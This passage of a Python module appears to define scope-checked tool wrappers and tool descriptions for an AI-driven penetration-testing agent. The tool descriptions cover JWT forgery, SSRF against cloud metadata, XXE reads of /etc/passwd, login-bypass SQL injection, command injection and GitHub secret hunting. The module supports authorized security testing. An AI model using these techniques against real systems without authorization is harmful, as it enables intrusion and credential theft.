"""
Scope-checked tool wrappers + shared recon accumulator + evidence capture.

Every tool is scope-checked at the wrapper level (deny-overrides-allow). Beyond
the original recon binaries (subfinder/httpx/nmap/nuclei/ffuf/whatweb), this adds
binary-free HTTP tooling that ports OLYMPUS/Yggdrasil capabilities: an HTTP probe
that captures redacted evidence, Wayback archive gathering, body-validated
content discovery, scope-aware traversal/IDOR probes, OpenAPI import, and the
Round-Table rule-based playbook generator. Optional external binaries (katana,
dalfox, sqlmap) degrade gracefully to a skip if not installed.
"""
import asyncio
import json
import os
import re
import shutil
import tempfile
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, urlunparse

import authz_tool as authz
import db
import dns_recon
import guidance as guidance_mod
import surface as surface_mod
import web_security as ws
import xss_tool as xt
from scope import ScopeEngine, PermissionLevel


@dataclass
class ToolResult:
    tool: str
    target: str
    success: bool
    output: str
    findings: list = field(default_factory=list)
    error: Optional[str] = None


TOOL_PERMISSIONS = {
    "run_subfinder": PermissionLevel.PASSIVE,
    "run_crtsh": PermissionLevel.PASSIVE,
    "run_wayback": PermissionLevel.PASSIVE,
    "run_dns": PermissionLevel.PASSIVE,
    "run_asn": PermissionLevel.PASSIVE,
    "run_github_recon": PermissionLevel.PASSIVE,
    "generate_playbook": PermissionLevel.PASSIVE,
    "store_finding": PermissionLevel.PASSIVE,
    "run_httpx": PermissionLevel.ACTIVE,
    "run_cloud_probe": PermissionLevel.ACTIVE,
    "run_whatweb": PermissionLevel.ACTIVE,
    "run_fingerprint": PermissionLevel.ACTIVE,
    "run_nmap": PermissionLevel.ACTIVE,
    "run_nmap_vuln": PermissionLevel.INTRUSIVE,
    "run_nuclei": PermissionLevel.ACTIVE,
    "http_probe": PermissionLevel.ACTIVE,
    "fetch_openapi": PermissionLevel.ACTIVE,
    "run_katana": PermissionLevel.ACTIVE,
    "check_takeover": PermissionLevel.ACTIVE,
    "run_graphql": PermissionLevel.ACTIVE,
    "run_jwt": PermissionLevel.ACTIVE,
    "run_oauth": PermissionLevel.ACTIVE,
    "run_xss": PermissionLevel.ACTIVE,
    "run_dom_audit": PermissionLevel.ACTIVE,
    "run_anomaly_scan": PermissionLevel.ACTIVE,
    "run_js_review": PermissionLevel.ACTIVE,
    "run_csrf": PermissionLevel.ACTIVE,
    "run_ffuf": PermissionLevel.INTRUSIVE,
    "run_content_discovery": PermissionLevel.INTRUSIVE,
    "run_web_probes": PermissionLevel.INTRUSIVE,
    "run_injection_probes": PermissionLevel.INTRUSIVE,
    "run_bfla": PermissionLevel.INTRUSIVE,
    "run_race": PermissionLevel.INTRUSIVE,
    "run_ssrf": PermissionLevel.INTRUSIVE,
    "run_deserialization": PermissionLevel.INTRUSIVE,
    "run_exposure": PermissionLevel.INTRUSIVE,
    "run_xxe": PermissionLevel.INTRUSIVE,
    "run_sqli": PermissionLevel.INTRUSIVE,
    "run_auth_sqli": PermissionLevel.INTRUSIVE,
    "run_form_cmdi": PermissionLevel.INTRUSIVE,
    "run_nosqli": PermissionLevel.INTRUSIVE,
    "run_form_nosqli": PermissionLevel.INTRUSIVE,
    "run_upload_test": PermissionLevel.INTRUSIVE,
    "run_stored_xss": PermissionLevel.INTRUSIVE,
    "run_param_mine": PermissionLevel.INTRUSIVE,
    "run_cache_poison": PermissionLevel.INTRUSIVE,
    "run_llm_probe": PermissionLevel.INTRUSIVE,
    "run_cmdi": PermissionLevel.INTRUSIVE,
    "run_zap": PermissionLevel.INTRUSIVE,
    "run_dalfox": PermissionLevel.INTRUSIVE,
    "run_sqlmap": PermissionLevel.INTRUSIVE,
    # ── capability expansion (2026-07) ──
    "run_dork_gen": PermissionLevel.PASSIVE,       # offline query generation only
    "run_hash_id": PermissionLevel.PASSIVE,        # offline hash-type identification
    "run_sourcemap": PermissionLevel.ACTIVE,       # fetches *.js.map from in-scope host
    "run_metadata": PermissionLevel.ACTIVE,        # fetches a file, extracts EXIF/metadata
    "run_hash_crack": PermissionLevel.INTRUSIVE,   # OFFLINE dictionary crack of a supplied hash (never live auth)
    "run_ferox": PermissionLevel.INTRUSIVE,        # optional feroxbuster adapter
    "run_dirsearch": PermissionLevel.INTRUSIVE,    # optional dirsearch adapter
    "run_gobuster": PermissionLevel.INTRUSIVE,     # optional gobuster adapter
    "run_nosqlmap": PermissionLevel.INTRUSIVE,     # optional NoSQLMap adapter
    "run_dir_harvest": PermissionLevel.INTRUSIVE,  # browsable-dir file harvest + null-byte bypass
    # ── LLM investigative action primitives ──
    "http_read": PermissionLevel.ACTIVE,           # scope-guarded SAFE-method request (read atom)
    "http_diff": PermissionLevel.ACTIVE,           # deterministic two-request differential (oracle substrate)
    "http_request": PermissionLevel.INTRUSIVE,     # scope-guarded ANY-method request (write atom, gated)
    "confirm_idor": PermissionLevel.ACTIVE,        # deterministic IDOR/BOLA oracle-helper (auto-confirms)
    "enumerate_ids": PermissionLevel.INTRUSIVE,    # bounded object-id enumeration (declarative, gated)
    "confirm_create_object_idor": PermissionLevel.INTRUSIVE,   # creates+deletes an owned object (bounded, cleaned up)
    "acquire_session": PermissionLevel.ACTIVE,     # single authorized login → reusable named session (anti-brute-force capped)
    "browser_navigate": PermissionLevel.ACTIVE,    # declarative headless-browser drive + client-state capture
    "test_numeric_abuse": PermissionLevel.INTRUSIVE,  # business-logic numeric boundary probing (gated, never finalizes)
    "mission_state": PermissionLevel.PASSIVE,      # read acquired identities/capabilities/chaining hints
    "mission_intel": PermissionLevel.PASSIVE,      # read harvested target-intelligence candidates (fixtures)
    "run_workflow": PermissionLevel.INTRUSIVE,     # execute a declarative technique-pack workflow (gated)
    "list_workflows": PermissionLevel.PASSIVE,     # list reusable technique packs + required inputs
    "benchmark_lab": PermissionLevel.ACTIVE,       # score coverage vs a known lab's completion oracle (separate module)
}

_UA = "Mozilla/5.0 (compatible; Apolaki/2.0; +authorized-testing)"
# Session-destroying endpoints. Crawling or probing these on an AUTHENTICATED scan
# logs the scanner out and silently kills all subsequent authenticated coverage, so
# they never enter the surface.
_SESSION_KILL_RE = re.compile(
    r"(?:^|/)(?:logout|log-?out|signout|sign-?out|log_?off|deauth|disconnect)(?:[./?]|$)"
    r"|[?&](?:action|do|op|mode)=(?:logout|signout|log-?out)", re.I)
# Recursive/duplicated leak paths (e.g. /_debug/_debug/_debug from an endpoint that
# accepts any trailing path). These are pure noise that floods the surface — reject
# any URL where a leak segment repeats, so neither a crawl nor warm-start reseeds them.
_RECURSIVE_LEAK_RE = re.compile(r"(?:/(?:_?debug|dump|export)\b).*(?:/(?:_?debug|dump|export)\b)", re.I)


def _chrome_path():
    """Locate a headless Chromium for the XSS execution pass (env override or the
    Playwright browser bundle). Returns None if none is available."""
    import glob
    env = os.getenv("BBH_CHROME_PATH")
    if env and os.path.exists(env):
        return env
    for pat in ("/opt/pw-browsers/chromium-*/chrome-linux/chrome",
                "/opt/pw-browsers/chromium-*/chrome-linux64/chrome"):
        hits = sorted(glob.glob(pat))
        if hits:
            return hits[-1]
    return None


# Cached result of the startup XSS-confirmer probe. None = not probed yet.
# Presence of a chrome binary is NOT enough on slim images (missing shared libs);
# the only honest signal is "a headless launch actually succeeds".
_XSS_CONFIRM_OK = None


async def probe_xss_confirm() -> bool:
    """Actually launch headless Chromium and open about:blank. Caches + returns
    the result so /health, /config, and the run banner can report truthfully
    whether reflected XSS can be browser-CONFIRMED (vs. staying advisory leads)."""
    global _XSS_CONFIRM_OK
    chrome = _chrome_path()
    if not chrome:
        _XSS_CONFIRM_OK = False
        return False

    async def _launch():
        from playwright.async_api import async_playwright
        os.environ.setdefault("PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD", "1")
        async with async_playwright() as pw:
            b = await pw.chromium.launch(headless=True, executable_path=chrome,
                                         args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
            page = await b.new_page()
            await page.goto("about:blank", timeout=5000)
            await b.close()

    try:
        await asyncio.wait_for(_launch(), timeout=15)   # a hung launch never blocks startup
        _XSS_CONFIRM_OK = True
    except Exception:
        _XSS_CONFIRM_OK = False
    return _XSS_CONFIRM_OK


def xss_confirm_status():
    """Cached probe result: True (launchable), False (absent/broken), or None
    (not yet probed)."""
    return _XSS_CONFIRM_OK


def _parse_sqlmap_proof(out: str) -> dict:
    """Extract the injection proof from a sqlmap run so a confirmed SQLi carries
    real evidence (parameter, place, techniques, payloads, back-end DBMS) instead
    of an opaque log tail. Pure/text-only so it is unit-testable.

    sqlmap prints a block like:
        Parameter: id (GET)
            Type: boolean-based blind
            Title: AND boolean-based blind - WHERE or HAVING clause
            Payload: id=1 AND 1234=1234
            Type: time-based blind
            ...
        back-end DBMS: MySQL >= 5.0
    """
    text = out or ""
    param = place = dbms = ""
    types: list = []
    payloads: list = []
    for raw in text.splitlines():
        s = raw.strip()
        if s.startswith("Parameter:") and not param:
            body = s.split("Parameter:", 1)[1].strip()
            param = body                         # e.g. "id (GET)"
            if "(" in body and body.endswith(")"):
                place = body[body.rfind("(") + 1:-1].strip()
        elif s.startswith("Type:"):
            t = s.split("Type:", 1)[1].strip()
            if t and t not in types:
                types.append(t)
        elif s.startswith("Payload:"):
            p = s.split("Payload:", 1)[1].strip()
            if p and p not in payloads:
                payloads.append(p)
        elif s.lower().startswith("back-end dbms:") and not dbms:
            dbms = s.split(":", 1)[1].strip()
    ev_parts = []
    if param:
        ev_parts.append(f"Injectable parameter: {param}")
    if types:
        ev_parts.append("Techniques confirmed: " + "; ".join(types))
    if payloads:
        ev_parts.append("Proof payload(s): " + " | ".join(payloads[:4]))
    if dbms:
        ev_parts.append(f"Back-end DBMS: {dbms}")
    if not ev_parts:
        # sqlmap said vulnerable but we couldn't parse the block — keep a tail so the
        # finding is never proofless (it must carry evidence to count as confirmed).
        ev_parts.append("sqlmap reported the target injectable; see log tail:\n" + text[-600:])
    return {
        "parameter": param, "place": place, "dbms": dbms,
        "types": types, "payloads": payloads,
        "evidence_text": "\n".join(ev_parts),
    }

# Anomaly signatures for run_anomaly_scan — verbose errors, stack traces, debug output,
# and internal-path disclosure that a skilled tester would notice and chase. These are
# advisory HUNT LEADS, never confirmations.
_ANOMALY_RX = [
    ("a stack trace / verbose error",
     re.compile(r"Traceback \(most recent call|\bat [\w.$]+\([\w.]+\.(?:java|kt|scala):\d+\)|"
                r"System\.\w+Exception|Fatal error:|Uncaught \w+Error|\bon line \d+\b|"
                r"\.(?:php|rb|py|java|aspx?):\d+\b|ORA-\d{5}|SQLSTATE\[", re.I)),
    ("debug / dev output",
     re.compile(r"var_dump\(|print_r\(|phpinfo\(\)|\bwerkzeug\b|Whoops\\|DEBUG = True|"
                r"django\.core|\bstack trace\b|__debug__", re.I)),
    ("internal path / host disclosure",
     re.compile(r"[A-Za-z]:\\\\(?:inetpub|xampp|wamp|www|Users)\\|/var/www/|/home/[\w.-]+/|"
                r"/usr/local/(?:www|apache)|/opt/\w+/", re.I)),
]
# Response headers that leak stack/version/debug info (Server/X-Powered-By only when they
# carry a version digit; the always-interesting ones are handled unconditionally).
_LEAK_HEADERS = ("x-powered-by", "server", "x-aspnet-version", "x-aspnetmvc-version",
                 "x-debug", "x-runtime", "x-generator")

# High-value hidden-parameter names for run_param_mine (curated, not exhaustive; the
# intensity dial widens how many are tested). Ordered by rough hit-likelihood.
_PARAM_WORDS = [
    "id", "page", "p", "q", "query", "search", "s", "keyword", "cat", "category", "filter",
    "sort", "order", "limit", "offset", "start", "count", "user", "username", "uid", "user_id",
    "account", "email", "name", "title", "product", "item", "pid", "sku", "code", "ref",
    "token", "key", "api_key", "apikey", "auth", "session", "redirect", "redirect_uri", "url",
    "uri", "next", "return", "returnurl", "callback", "continue", "dest", "destination", "file",
    "filename", "path", "dir", "folder", "doc", "document", "view", "template", "tpl", "include",
    "lang", "locale", "debug", "test", "admin", "preview", "mode", "action", "cmd", "exec",
    "format", "type", "output", "json", "xml",
]

# ── Canonical tool definitions (Anthropic format) ────────────────
CLAUDE_TOOLS = [
    {"name": "run_subfinder",
     "description": "PASSIVE: Enumerate subdomains via OSINT sources. Zero direct target contact.",
     "input_schema": {"type": "object", "properties": {"domain": {"type": "string"}}, "required": ["domain"]}},
    {"name": "run_crtsh",
     "description": "PASSIVE: Certificate-transparency log enumeration. Zero direct target contact.",
     "input_schema": {"type": "object", "properties": {"domain": {"type": "string"}}, "required": ["domain"]}},
    {"name": "run_wayback",
     "description": "PASSIVE: Gather historical URLs for a domain from the Wayback Machine (web.archive.org). Seeds the attack surface with old endpoints and parameters. No target contact.",
     "input_schema": {"type": "object", "properties": {"domain": {"type": "string"}}, "required": ["domain"]}},
    {"name": "run_dns",
     "description": "PASSIVE: DNS intelligence via DNS-over-HTTPS — A/NS/MX/TXT/CAA records, SPF + DMARC policy (email-spoofing exposure), and vendor fingerprints from TXT. No target contact. Run on each in-scope root domain to enrich the playbook.",
     "input_schema": {"type": "object", "properties": {"domain": {"type": "string"}}, "required": ["domain"]}},
    {"name": "run_cloud_probe",
     "description": ("ACTIVE (cloud): probe ONE discovered object-storage bucket URL (S3 / Azure Blob / GCS) for "
                     "PUBLIC listing without credentials. Scope-gated, read-only GET. A public listing is a "
                     "confirmed exposure finding. Use it on a candidate storage URL surfaced by crawl or by "
                     "github cloud-name recon — not on the app root."),
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_asn",
     "description": ("PASSIVE: IP + ASN + BGP prefix (CIDR range) + AS/org name for a domain, via DNS-over-HTTPS "
                     "and Team Cymru. Reveals the organization's dedicated IP range for scope expansion. No target "
                     "contact."),
     "input_schema": {"type": "object", "properties": {"domain": {"type": "string"}}, "required": ["domain"]}},
    {"name": "run_github_recon",
     "description": ("PASSIVE: Hunt for leaked secrets on PUBLIC GitHub. Queries GitHub's code-search API (never the "
                     "target) with secret dorks against the org's domain/name and scans returned code fragments for "
                     "hardcoded credentials (AWS/Google/Slack/Stripe keys, private keys, tokens, passwords). Uses the "
                     "operator's own read-only PAT (BBH_GITHUB_TOKEN) only to lift the rate limit; skips cleanly if "
                     "unset. Secret samples are redacted."),
     "input_schema": {"type": "object", "properties": {
         "domain": {"type": "string"},
         "org": {"type": "string", "description": "Optional GitHub org / company name (defaults to the domain label)"},
         "extra_terms": {"type": "array", "items": {"type": "string"}, "description": "Extra search terms (employee handles, product names)"}},
         "required": ["domain"]}},
    {"name": "run_fingerprint",
     "description": ("ACTIVE: Native tech-stack fingerprint of one URL from response headers, cookies, and HTML/JS "
                     "signatures — server/language/framework/CMS + versions. Binary-free. Flags precise version "
                     "banners for CVE lookup and feeds the playbook with the detected stack."),
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "check_takeover",
     "description": "ACTIVE: Subdomain-takeover detection. Resolves CNAMEs for discovered subdomains and matches provider fingerprints (GitHub Pages, S3, Heroku, Fastly, Shopify, etc.) against the response. Pass 'subdomains' or it uses everything discovered so far.",
     "input_schema": {"type": "object", "properties": {
         "subdomains": {"type": "array", "items": {"type": "string"}}}, "required": []}},
    {"name": "run_httpx",
     "description": "ACTIVE: Probe hosts for live HTTP/HTTPS, status, title, tech stack.",
     "input_schema": {"type": "object", "properties": {
         "targets": {"type": "array", "items": {"type": "string"}},
         "ports": {"type": "string", "default": "80,443,8080,8443,3000,8000,9000"}}, "required": ["targets"]}},
    {"name": "http_probe",
     "description": "ACTIVE: Fetch a single URL, capture the request/response as redacted evidence, return status/title/security-headers and extract in-scope links + parameters into the attack surface. Use this to enrich recon before generating a playbook.",
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_whatweb",
     "description": "ACTIVE: Web technology fingerprinting (CMS, frameworks, server versions).",
     "input_schema": {"type": "object", "properties": {"target": {"type": "string"}}, "required": ["target"]}},
    {"name": "run_nmap",
     "description": "ACTIVE: Port scan + service/version detection.",
     "input_schema": {"type": "object", "properties": {
         "target": {"type": "string"}, "flags": {"type": "string", "default": "-sT -sV --top-ports 1000 -T3"}},
         "required": ["target"]}},
    {"name": "run_nmap_vuln",
     "description": ("INTRUSIVE: Heavyweight nmap NSE vulnerability scan — the full `vuln` script category "
                     "minus DoS, with -sV service/version detection. The script set is hard-coded (no --script "
                     "injection). Network-vuln signals are version/behaviour-based, so every hit is a truth-first "
                     "advisory LEAD, never a confirmed finding. Slow; run on primary in-scope hosts in Full mode."),
     "input_schema": {"type": "object", "properties": {
         "target": {"type": "string", "description": "Host or IP to NSE-vuln-scan"}},
         "required": ["target"]}},
    {"name": "run_nuclei",
     "description": ("ACTIVE/INTRUSIVE: Template vuln scanner. Safe tags: tech,misconfig,exposed-panels,takeovers. "
                     "Intrusive tags: cve,sqli,xss,rce. Start safe, escalate to cve only on confirmed targets."),
     "input_schema": {"type": "object", "properties": {
         "target": {"type": "string"}, "tags": {"type": "string"},
         "severity": {"type": "string", "default": "low,medium,high,critical"}}, "required": ["target", "tags"]}},
    {"name": "fetch_openapi",
     "description": "ACTIVE: Fetch an OpenAPI/Swagger spec URL and import its endpoints (scope-safe: anchored to the base host) into the attack surface.",
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_katana",
     "description": "ACTIVE: Crawl a URL for in-scope links, forms, and JS endpoints (requires katana; skips gracefully if unavailable).",
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_graphql",
     "description": ("ACTIVE: Probe a GraphQL endpoint. Auto-discovers the endpoint (/graphql etc.), runs introspection "
                     "to enumerate queries/mutations/subscriptions, and tests for common security gaps: introspection "
                     "exposure, field-suggestion leaks, and request batching (brute-force amplification)."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "A base URL or a suspected GraphQL endpoint"}}, "required": ["url"]}},
    {"name": "run_jwt",
     "description": ("ACTIVE: Analyze and attack a JWT (Bearer token). Decodes header/payload, then runs offline "
                     "attacks: alg:none forge, HMAC weak-secret crack, and — if the secret cracks — forges an admin "
                     "token. Optionally verifies a forged token against an in-scope endpoint (url + header_name)."),
     "input_schema": {"type": "object", "properties": {
         "token": {"type": "string", "description": "The JWT to analyze (three dot-separated base64url parts)"},
         "url": {"type": "string", "description": "Optional in-scope endpoint to test forged tokens against"},
         "header_name": {"type": "string", "default": "Authorization"},
         "extra_secrets": {"type": "array", "items": {"type": "string"}, "description": "Optional extra secret guesses"}},
         "required": ["token"]}},
    {"name": "run_oauth",
     "description": ("ACTIVE: OAuth/SSO security test on an authorization URL (one containing client_id/redirect_uri/"
                     "response_type, e.g. /oauth/authorize?...). Tests redirect_uri validation with bypass variants "
                     "(external host, subdomain suffix, @-userinfo, path-prefixed host, backslash, open-redirect "
                     "chain) and confirms code/token theft if the server redirects to an attacker host; also checks "
                     "missing-state CSRF and implicit-flow token-in-URL leakage. Non-destructive (authorization GETs "
                     "only)."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "An OAuth authorization URL with its query parameters"}}, "required": ["url"]}},
    {"name": "run_csrf",
     "description": ("ACTIVE: Scan a page for CSRF-vulnerable state-changing forms. Parses each form, checks for an "
                     "anti-CSRF token, reads the session cookie's SameSite attribute, and flags token-less POST forms "
                     "(graded by SameSite) and sensitive GET state-changing actions. Non-destructive — sends no "
                     "state-changing requests."),
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_js_review",
     "description": ("ACTIVE: Static review (SAST-lite) of JavaScript / source. Fetches in-scope JS (or reviews "
                     "pasted `code`) and flags hardcoded secrets/API keys, dangerous sinks (eval/innerHTML/exec/"
                     "unserialize/pickle), weak crypto, and revealing developer comments — and mines endpoints/paths "
                     "into the attack surface. Run after crawl/wayback to review discovered .js bundles."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "A single JS/source URL"},
         "urls": {"type": "array", "items": {"type": "string"}},
         "code": {"type": "string", "description": "Paste source to review directly (no fetch)"}}, "required": []}},
    {"name": "run_xss",
     "description": ("ACTIVE: Cross-site scripting test on a URL. First does context-aware reflection analysis "
                     "(finds where each parameter reflects — HTML/attribute/script/comment — and whether a breakout "
                     "survives unescaped), then CONFIRMS execution in a real headless browser (alert fires). The "
                     "browser pass also catches DOM-only XSS via the URL fragment. Pass a URL with query parameters."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"},
         "params": {"type": "array", "items": {"type": "string"}, "description": "Parameters to test (default: all in the URL)"}},
         "required": ["url"]}},
    {"name": "run_dom_audit",
     "description": ("ACTIVE: Dynamic client-side DOM audit in a real headless browser. Injects unique canaries into "
                     "DOM sources (location.hash / query params) and CONFIRMS DOM-based prototype pollution, DOM XSS, "
                     "DOM open redirect, and client-side template injection (CSTI) by observing the actual sink firing. "
                     "Turns the leads static JS review can only flag into confirmed findings. Pass an HTML page URL."),
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_ffuf",
     "description": "INTRUSIVE: Directory/endpoint fuzzing. Include FUZZ in the URL.",
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"}, "wordlist": {"type": "string", "default": "/usr/share/wordlists/dirb/common.txt"},
         "filter_codes": {"type": "string", "default": "404,403"}, "method": {"type": "string", "default": "GET"}},
         "required": ["url"]}},
    {"name": "run_content_discovery",
     "description": "INTRUSIVE: Body-validated content discovery. Probes a curated + surface-derived wordlist against a base URL and only reports a path when its RESPONSE BODY matches the sensitive-content signature (defeats catch-all SPA 200s). Binary-free.",
     "input_schema": {"type": "object", "properties": {
         "base_url": {"type": "string"}, "max_paths": {"type": "integer", "default": 120}}, "required": ["base_url"]}},
    {"name": "run_web_probes",
     "description": ("INTRUSIVE: Scope-aware path-traversal + IDOR probing on a parameterized URL. Compares each probe "
                     "response to a baseline and reports only anomalies (canary/passwd signatures, near-identical "
                     "cross-object responses). Binary-free; captures evidence."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "URL with query parameters, e.g. https://t/api?id=5&file=a.txt"},
         "lab_mode": {"type": "boolean", "default": False}}, "required": ["url"]}},
    {"name": "run_injection_probes",
     "description": ("INTRUSIVE: Reflection-based probes on a URL — CORS misconfiguration (reflected Origin + "
                     "credentials), open redirect, host-header injection, and SSTI ({{7*7}} -> 49). Binary-free; "
                     "captures evidence and reports only confirmed reflections."),
     "input_schema": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}},
    {"name": "run_bfla",
     "description": ("INTRUSIVE: Function-level authorization test (BFLA) + side-channel BOLA oracle. Sends multiple "
                     "HTTP methods (GET/POST/PUT/PATCH; DELETE only if allow_delete=true) with the supplied token and "
                     "flags 2xx on write methods or admin paths that the token should not reach. Also compares an "
                     "existing vs nonexistent resource to detect an enumeration oracle. Provide a token that should "
                     "NOT be authorized (a low-priv / other-user token)."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"},
         "headers": {"type": "object", "description": "Auth headers for the token under test (e.g. Authorization)"},
         "allow_delete": {"type": "boolean", "default": False}}, "required": ["url"]}},
    {"name": "run_race",
     "description": ("INTRUSIVE: Race-condition (TOCTOU) test. Warms an HTTP/2 pool, parks N workers on a gate and "
                     "releases them together (tight synchronization), then optionally reads a verify_url (a state "
                     "endpoint like a balance/vote count) before and after — a state CHANGE is the confirmed race, "
                     "not just repeated 200s. Point it at an action you are authorized to trigger; use a request that "
                     "should be allowed once but not multiple times."),
     "input_schema": {"type": "object", "properties": {
         "method": {"type": "string", "default": "POST"}, "url": {"type": "string"},
         "headers": {"type": "object"}, "body": {"type": "string"},
         "count": {"type": "integer", "default": 20},
         "rounds": {"type": "integer", "default": 3, "description": "Retry the burst N times; race success is luck-dependent"},
         "verify_url": {"type": "string", "description": "In-scope GET endpoint whose response reflects state (balance/count) to confirm the race"},
         "verify_headers": {"type": "object", "description": "Headers for the verify request (defaults to headers)"}},
         "required": ["url"]}},
    {"name": "run_ssrf",
     "description": ("INTRUSIVE: Server-Side Request Forgery test on a parameterized URL. Three layers: (1) regular "
                     "SSRF — points URL-ish parameters at cloud metadata endpoints (AWS/GCP/Azure/Alibaba/DO) and "
                     "detects real metadata content in the response (not the echoed payload, so no false positives); "
                     "(2) blind SSRF — an internal open-vs-closed port oracle (status/timing/connect differential); "
                     "(3) optional OOB probe if a collaborator domain is configured. Also carries filter-bypass "
                     "encodings (decimal/octal/hex/IPv6 of 127.0.0.1 and 169.254.169.254)."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "URL with query parameters, e.g. https://t/fetch?url=x"},
         "params": {"type": "array", "items": {"type": "string"}, "description": "Parameters to test (default: URL-ish ones, else all)"},
         "open_port": {"type": "integer", "default": 80, "description": "A likely-OPEN internal port for the blind oracle"},
         "closed_port": {"type": "integer", "default": 1, "description": "A likely-CLOSED internal port for the blind oracle"},
         "oob_domain": {"type": "string", "description": "Optional collaborator domain for an out-of-band probe (e.g. xyz.oast.pro)"}},
         "required": ["url"]}},
    {"name": "run_deserialization",
     "description": ("INTRUSIVE: Insecure-deserialization test. Detects serialized objects (PHP serialize(), Java "
                     "ObjectInputStream / base64 rO0, Python pickle, .NET BinaryFormatter, Ruby Marshal) in query "
                     "parameters and cookies, then CONFIRMS the sink non-destructively by sending a corrupted copy and "
                     "watching for a deserialization exception in the response. Never sends gadget chains. Pass a URL; "
                     "cookies are read from the session or the optional cookies map."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"},
         "cookies": {"type": "object", "description": "Optional name->value cookies to test (adds to session cookies)"},
         "params": {"type": "array", "items": {"type": "string"}, "description": "Restrict to these query params (default: all)"}},
         "required": ["url"]}},
    {"name": "run_exposure",
     "description": ("INTRUSIVE: Information-disclosure scan for exposed high-value files — .git/.svn directories, "
                     ".env / wp-config backups / .aws credentials, phpinfo / server-status, .htpasswd, and DB dumps. "
                     "Each hit is confirmed by a strong content signature (so a catch-all 200 page cannot false-"
                     "positive); a readable .git yields a source-recoverable escalation."),
     "input_schema": {"type": "object", "properties": {
         "base_url": {"type": "string", "description": "Base URL, e.g. https://target/"}}, "required": ["base_url"]}},
    {"name": "run_xxe",
     "description": ("INTRUSIVE: XML External Entity test on an endpoint that accepts XML. Sends in-band file-read "
                     "payloads (file:///etc/passwd etc.) and confirms when the file content is reflected; if a native "
                     "OOB collaborator is configured (BBH_OOB_BASE), also sends a blind parameter-entity payload and "
                     "confirms via the server-side callback. Pass a sample XML body to graft the payload onto the "
                     "app's real schema."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string"},
         "xml": {"type": "string", "description": "Optional sample XML body to mutate (matches the app's schema)"},
         "content_type": {"type": "string", "default": "application/xml"}}, "required": ["url"]}},
    {"name": "run_sqli",
     "description": ("INTRUSIVE: Native SQL-injection test on a parameterized URL. Three baseline-confirmed oracles: "
                     "error-based (injects a quote, detects a DBMS error + fingerprints MySQL/Postgres/MSSQL/Oracle/"
                     "SQLite), boolean-blind (always-true vs always-false condition diff), and time-based blind "
                     "(SLEEP/pg_sleep/WAITFOR with a sleep(0) control). Read-only payloads (no stacked writes). "
                     "Complements run_sqlmap without needing the binary."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "URL with query parameters, e.g. https://t/item?id=1"},
         "params": {"type": "array", "items": {"type": "string"}, "description": "Params to test (default: all in the URL)"},
         "delay": {"type": "integer", "default": 5, "description": "Seconds for the time-based sleep probe"}},
         "required": ["url"]}},
    {"name": "run_auth_sqli",
     "description": ("INTRUSIVE: Auth-bypass SQL injection on a login endpoint via the POST/JSON request BODY "
                     "(e.g. a JSON {email,password} login) — the class query-string SQLi probes cannot reach. "
                     "Baselines with a benign credential, injects OR-based payloads into each credential field, and "
                     "confirms a real bypass (a session/JWT token or 401->200 flip) or a DBMS error. Non-destructive: "
                     "only submits login attempts."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "Login endpoint, e.g. https://t/rest/user/login"},
         "fields": {"type": "array", "items": {"type": "string"},
                    "description": "Body field names (default: email/username + password)"}},
         "required": ["url"]}},
    {"name": "run_form_cmdi",
     "description": ("INTRUSIVE: OS command injection on a captured HTML FORM via its POST body (e.g. a DVWA-style "
                     "exec form POSTing `ip`) — the body-parameter class query-string cmdi cannot reach. Baselines the "
                     "form, injects computed-output + time payloads into each field, reuses the cmdi oracles (an echoed "
                     "payload cannot false-positive)."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "A form action URL, or a page URL whose forms will be discovered"},
         "fields": {"type": "array", "items": {"type": "string"},
                    "description": "Optional form field names; if omitted the page is fetched and its forms parsed"}},
         "required": ["url"]}},
    {"name": "run_stored_xss",
     "description": ("INTRUSIVE: SECOND-ORDER / STORED XSS. Submits a unique executing canary into a form, then "
                     "browser-loads display pages and confirms the payload EXECUTES somewhere it was not directly "
                     "reflected (alert with a unique marker = proof). Persists a canary to the target — Full mode, "
                     "authorized testing only. Confirmed by real browser execution, never reflection."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "Form action URL that stores user input"},
         "fields": {"type": "array", "items": {"type": "string"}, "description": "Optional form field names"}},
         "required": ["url"]}},
    {"name": "run_anomaly_scan",
     "description": ("ACTIVE: anomaly hunting ('intuition' leads). Fetches a page and flags verbose errors / stack "
                     "traces / internal-path disclosure / debug + version-leak headers as advisory 'dig here' LEADS "
                     "(candidate, never confirmed). Great on error pages and app roots."),
     "input_schema": {"type": "object", "properties": {
         "url": {"type": "string", "description": "Page/endpoint to inspect for anomalies"}}, "required": ["url"]}},
    {"name": "run_param_mine",
     "description": ("INTRUSIVE: active PARAMETER MINING — brute-force hidden query parameters on an endpoint so "
                     "injection probes reach inputs the crawl never saw. A candidate that reflects its canary or "
